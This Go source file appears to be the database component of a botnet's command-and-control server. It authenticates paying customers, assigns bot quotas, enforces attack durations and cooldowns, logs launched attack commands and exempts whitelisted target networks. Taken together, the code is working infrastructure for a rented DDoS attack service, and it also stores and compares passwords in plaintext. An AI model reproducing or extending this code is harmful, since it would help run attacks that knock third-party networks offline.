package main

import (
    "database/sql"
    "fmt"
    "net"
    "encoding/binary"
    _ "github.com/go-sql-driver/mysql"
    "time"
    "errors"
)

type Database struct {
    db      *sql.DB
}

type AccountInfo struct {
    username    string
    maxBots     int
    admin       int
}

func NewDatabase(dbAddr string, dbUser string, dbPassword string, dbName string) *Database {
    db, err := sql.Open("mysql", fmt.Sprintf("%s:%s@tcp(%s)/%s", dbUser, dbPassword, dbAddr, dbName))
    if err != nil {
        fmt.Println(err)
    }
    fmt.Println("Mysql DB opened")
    return &Database{db}
}

func (this *Database) TryLogin(username string, password string) (bool, AccountInfo) {
    rows, err := this.db.Query("SELECT username, max_bots, admin FROM users WHERE username = ? AND password = ? AND (wrc = 0 OR (UNIX_TIMESTAMP() - last_paid < `intvl` * 24 * 60 * 60))", username, password)
    if err != nil {
        fmt.Println(err)
        return false, AccountInfo{"", 0, 0}
    }
    defer rows.Close()
    if !rows.Next() {
        return false, AccountInfo{"", 0, 0}
    }
    var accInfo AccountInfo
    rows.Scan(&accInfo.username, &accInfo.maxBots, &accInfo.admin)
    return true, accInfo
}

func (this *Database) CreateUser(username string, password string, max_bots int, duration int, cooldown int) bool {
    rows, err := this.db.Query("SELECT username FROM users WHERE username = ?", username)
    if err != nil {
        fmt.Println(err)
        return false
    }
    if rows.Next() {
        return false
    }
    this.db.Exec("INSERT INTO users (username, password, max_bots, admin, last_paid, cooldown, duration_limit) VALUES (?, ?, ?, 0, UNIX_TIMESTAMP(), ?, ?)", username, password, max_bots, cooldown, duration)
    return true
}

func (this *Database) ContainsWhitelistedTargets(attack *Attack) bool {
    rows, err := this.db.Query("SELECT prefix, netmask FROM whitelist")
    if err != nil {
        fmt.Println(err)
        return false
    }
    defer rows.Close()
    for rows.Next() {
        var prefix string
        var netmask uint8
        rows.Scan(&prefix, &netmask)

        // Parse prefix
        ip := net.ParseIP(prefix)
        ip = ip[12:]
        iWhitelistPrefix := binary.BigEndian.Uint32(ip)

        for aPNetworkOrder, aN := range attack.Targets {
            rvBuf := make([]byte, 4)
            binary.BigEndian.PutUint32(rvBuf, aPNetworkOrder)
            iAttackPrefix := binary.BigEndian.Uint32(rvBuf)
            if aN > netmask { // Whitelist is less specific than attack target
                if netshift(iWhitelistPrefix, netmask) == netshift(iAttackPrefix, netmask) {
                    return true
                }
            } else if aN < netmask { // Attack target is less specific than whitelist
                if (iAttackPrefix >> aN) == (iWhitelistPrefix >> aN) {
                    return true
                }
            } else { // Both target and whitelist have same prefix
                if (iWhitelistPrefix == iAttackPrefix) {
                    return true
                }
            }
        }
    }
    return false
}

func (this *Database) CanLaunchAttack(username string, duration uint32, fullCommand string, maxBots int, allowConcurrent int) (bool, error) {
    rows, err := this.db.Query("SELECT id, duration_limit, cooldown FROM users WHERE username = ?", username)
    defer rows.Close()
    if err != nil {
        fmt.Println(err)
    }
    var userId, durationLimit, cooldown uint32
    if !rows.Next() {
        return false, errors.New("Your access has been terminated")
    }
    rows.Scan(&userId, &durationLimit, &cooldown)

    if durationLimit != 0 && duration > durationLimit {
        return false, errors.New(fmt.Sprintf("You may not send attacks longer than %d seconds.", durationLimit))
    }
    rows.Close()

    if allowConcurrent == 0 {
        rows, err = this.db.Query("SELECT time_sent, duration FROM history WHERE user_id = ? AND (time_sent + duration + ?) > UNIX_TIMESTAMP()", userId, cooldown)
        if err != nil {
            fmt.Println(err)
        }
        if rows.Next() {
            var timeSent, historyDuration uint32
            rows.Scan(&timeSent, &historyDuration)
            return false, errors.New(fmt.Sprintf("Please wait %d seconds before sending another attack", (timeSent + historyDuration + cooldown) - uint32(time.Now().Unix())))
        }
    }

    this.db.Exec("INSERT INTO history (user_id, time_sent, duration, command, max_bots) VALUES (?, UNIX_TIMESTAMP(), ?, ?, ?)", userId, duration, fullCommand, maxBots)
    return true, nil
}

func (this *Database) CheckApiCode(apikey string) (bool, AccountInfo) {
    rows, err := this.db.Query("SELECT username, max_bots, admin FROM users WHERE api_key = ?", apikey)
    if err != nil {
        fmt.Println(err)
        return false, AccountInfo{"", 0, 0}
    }
    defer rows.Close()
    if !rows.Next() {
        return false, AccountInfo{"", 0, 0}
    }
    var accInfo AccountInfo
    rows.Scan(&accInfo.username, &accInfo.maxBots, &accInfo.admin)
    return true, accInfo
}
